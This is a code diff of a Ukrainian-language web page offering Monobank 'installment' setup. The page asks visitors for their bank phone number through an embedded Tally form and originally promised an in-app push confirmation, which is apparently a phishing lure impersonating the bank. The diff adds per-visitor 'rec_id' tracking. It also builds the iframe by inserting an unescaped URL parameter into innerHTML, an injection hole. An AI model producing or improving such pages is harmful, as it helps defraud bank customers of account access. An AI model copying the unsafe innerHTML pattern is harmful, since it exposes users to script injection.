@@ -5,18 +5,37 @@
     <title>Оформлення розстрочки DIP</title>
     <style>
         body { margin: 0; font-family: sans-serif; background-color: #0d1117; color: white; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; }
-        .container { text-align: center; max-width: 500px; padding: 20px; }
-        iframe { width: 100%; height: 500px; border: none; border-radius: 10px; }
+        .container { text-align: center; max-width: 500px; padding: 20px; width: 100%; }
+        iframe { width: 100%; height: 600px; border: none; border-radius: 10px; }
     </style>
 </head>
 <body>
     <div class="container">
         <h1>Оформлення розстрочки</h1>
-        <p>Введіть ваш фінансовий номер телефону Monobank нижче. Вам прийде Пуш-повідомлення у додаток для підтвердження.</p>
+        <p>Введіть ваш фінансовий номер телефону Monobank нижче.</p>
         
-        <!-- Вставте сюди Embed код нової форми Tally -->
-        <iframe src="https://tally.so/embed/EkAMJ2?alignLeft=1&hideTitle=1&transparentBackground=1&dynamicHeight=1" loading="lazy"></iframe>
+        <!-- Контейнер для iframe -->
+        <div id="tally-container"></div>
     </div>
+
+    <script>
+        // 1. Отримуємо параметри з URL сайту
+        const urlParams = new URLSearchParams(window.location.search);
+        const recId = urlParams.get('rec_id');
+
+        // 2. Формуємо посилання на Tally з прокинутим параметром
+        // ЗАМІНІТЬ EkAMJ2 на ваш реальний ID форми Tally
+        let tallyUrl = "https://tally.so/embed/EkAMJ2?alignLeft=1&hideTitle=1&transparentBackground=1&dynamicHeight=1";
+        
+        if (recId) {
+            tallyUrl += "&rec_id=" + recId;
+        }
+
+        // 3. Вставляємо iframe в сторінку
+        const container = document.getElementById('tally-container');
+        container.innerHTML = `<iframe src="${tallyUrl}" loading="lazy" title="Оплата частинами"></iframe>`;
+    </script>
+    
     <script async src="https://tally.so/widgets/embed.js"></script>
 </body>
 </html>
